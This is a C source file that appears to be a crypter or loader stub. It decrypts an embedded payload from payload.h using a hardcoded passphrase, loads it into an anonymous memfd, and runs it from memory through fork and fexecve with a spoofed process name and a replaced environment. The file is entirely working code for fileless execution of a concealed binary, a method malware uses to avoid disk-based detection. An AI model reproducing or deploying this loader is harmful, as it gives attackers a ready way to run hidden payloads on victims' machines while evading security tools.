#define _GNU_SOURCE      // For syscall(), fexecve(), and possibly MFD_CLOEXEC
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h> // For SYS_memfd_create and syscall()
#include <sys/wait.h>
#include <errno.h>
#include <string.h> // For strlen, strerror

// Try to include sys/memfd.h, and set a flag if successful
#if __has_include(<sys/memfd.h>)
#include <sys/memfd.h>
#define HAVE_SYS_MEMFD_H 1
#else
#define HAVE_SYS_MEMFD_H 0
#endif

// Manually define MFD_CLOEXEC if not found (it's usually in sys/memfd.h)
#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

// Manually define SYS_memfd_create if not found from sys/syscall.h
#ifndef SYS_memfd_create
#ifdef __x86_64__
#define SYS_memfd_create 319
#elif defined(__aarch64__)
#define SYS_memfd_create 279
#elif defined(__arm__) && defined(__thumb__) && __ARM_ARCH == 7 // for ARM EABI like Raspberry Pi
#define SYS_memfd_create (__NR_SYSCALL_BASE + 385)
#elif defined(__arm__)
#define SYS_memfd_create 385
#else
#warning "SYS_memfd_create syscall number not defined for this architecture. Compilation might succeed but memfd creation will likely fail."
#endif
#endif

#include "payload.h"

static inline int create_memory_fd(const char *name, unsigned int flags) {
    int fd = -1;
#if HAVE_SYS_MEMFD_H && defined(__GLIBC__) && (__GLIBC__ > 2 || (__GLIBC__ == 2 && __GLIBC_MINOR__ >= 27))
    fd = memfd_create(name, flags);
    if (fd != -1) {
        return fd;
    }
#endif

#ifdef SYS_memfd_create
    fd = syscall(SYS_memfd_create, name, flags);
    if (fd != -1) {
        return fd;
    }
    // perror("syscall(SYS_memfd_create) failed"); // uncomment for debug
    return -1;
#else
    fprintf(stderr, "Error: SYS_memfd_create syscall number is not defined for this architecture.\n");
#if !(HAVE_SYS_MEMFD_H && defined(__GLIBC__) && (__GLIBC__ > 2 || (__GLIBC__ == 2 && __GLIBC_MINOR__ >= 27)))
    fprintf(stderr, "       And <sys/memfd.h> was not available or memfd_create() function call failed.\n");
#endif
    errno = ENOSYS;
    return -1;
#endif
}


void decrypt_data(unsigned char *data, size_t data_len, const char *passphrase);

int main(int argc, char *argv_main[]) {
    int fd;
    ssize_t n_written;
    pid_t pid;
    const char *decryption_key_string = "wiktor";

    if (enc_payload_len == 0) {
        fprintf(stderr, "Error: payload_len is 0. Is payload.h correctly generated and included?\n");
        return EXIT_FAILURE;
    }

    unsigned char *decrypted_data = malloc(enc_payload_len);
    if (!decrypted_data) {
        perror("Failed to allocate memory for decrypted_data");
        return EXIT_FAILURE;
    }
    memcpy(decrypted_data, enc_payload, enc_payload_len);

    // Decrypt the copy
    decrypt_data(decrypted_data, enc_payload_len, decryption_key_string);
    // xor_decrypt(decrypted_data, enc_payload_len, decryption_key_string);

    // ---- DEBUG: Write decrypted data to a file ----
    FILE *debug_out = fopen("decrypted_output.bin", "wb");
    if (debug_out) {
        fwrite(decrypted_data, 1, enc_payload_len, debug_out);
        fclose(debug_out);
        fprintf(stderr, "DEBUG: Wrote decrypted payload to decrypted_output.bin\n");
    } else {
        perror("DEBUG: Failed to open decrypted_output.bin for writing");
    }
    // ---- END DEBUG ----

    fd = create_memory_fd("my_ram_exe", MFD_CLOEXEC);
    if (fd == -1) {
        perror("create_memory_fd (memfd_create or syscall) failed");
        free(decrypted_data);
        return EXIT_FAILURE;
    }

    // Write the decrypted data (from the copy) to memfd
    n_written = write(fd, decrypted_data, enc_payload_len);
    free(decrypted_data); // Free the copy now

    if (n_written == -1) {
        perror("write to memfd failed");
        close(fd);
        return EXIT_FAILURE;
    }
    if (n_written != (ssize_t)enc_payload_len) {
        fprintf(stderr, "Partial write to memfd: %zd of %u bytes\n", n_written, enc_payload_len);
        close(fd);
        return EXIT_FAILURE;
    }

    pid = fork();
    if (pid == -1) {
        perror("fork failed");
        close(fd);
        return EXIT_FAILURE;
    }

    if (pid == 0) { // Child process
        char **child_argv = malloc((argc + 1) * sizeof(char*));
        if (!child_argv) {
            perror("malloc for child_argv failed");
            close(fd);
            _exit(127);
        }

        child_argv[0] = "(elf_from_mem)";
        for (int i = 1; i < argc; i++) {
            child_argv[i] = argv_main[i];
        }
        child_argv[argc] = NULL;

        char *child_envp[] = {"CUSTOM_VAR=SetByParentRunner", "PATH=/usr/bin:/bin", NULL};

        fexecve(fd, child_argv, child_envp);
        perror("fexecve failed");
        free(child_argv);
        close(fd);
        _exit(127);
    } else { // Parent process
        close(fd);
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            printf("Parent: Child exited with status %d\n", WEXITSTATUS(status));
        } else if (WIFSIGNALED(status)) {
            printf("Parent: Child terminated by signal %d (core dumped: %s)\n", WTERMSIG(status), WCOREDUMP(status) ? "yes" : "no");
        } else {
            printf("Parent: Child terminated abnormally\n");
        }
    }
    return EXIT_SUCCESS;
}